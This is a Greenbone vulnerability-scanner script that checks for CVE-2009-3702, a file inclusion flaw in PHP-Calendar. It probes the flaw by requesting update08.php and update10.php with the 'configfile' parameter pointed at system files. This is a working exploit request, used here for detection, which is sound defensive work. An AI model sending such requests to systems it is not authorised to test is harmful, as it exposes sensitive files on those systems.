# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:php-calendar:php-calendar";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901090");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-12-31 08:44:14 +0100 (Thu, 31 Dec 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-3702");
  script_name("PHP-Calendar Multiple Remote And Local File Inclusion Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("secpod_php_calendar_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("PHP-Calendar/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/508548/100/0/threaded");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37450");

  script_tag(name:"affected", value:"PHP-Calendar version 1.1 and prior on all platforms.");

  script_tag(name:"insight", value:"The flaw is due to error in 'configfile' parameter in 'update08.php' and
  'update10.php' which  is not properly verified before being used to include files.");

  script_tag(name:"solution", value:"Upgrade to PHP-Calendar version 1.4 or later.");

  script_tag(name:"summary", value:"PHP-Calendar is prone to Remote And Local File Inclusion vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to include and execute arbitrary
  files from local and external resources, and can gain sensitive information
  about remote system directories when register_globals is enabled.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.cascade.org.uk/software/php/calendar/");
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();
vulnfiles = make_list( "/update08.php", "/update10.php" );

foreach file( keys( files ) ) {

  foreach vulnfile( vulnfiles ) {

    url = dir + vulnfile + "?configfile=/" + files[file];

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
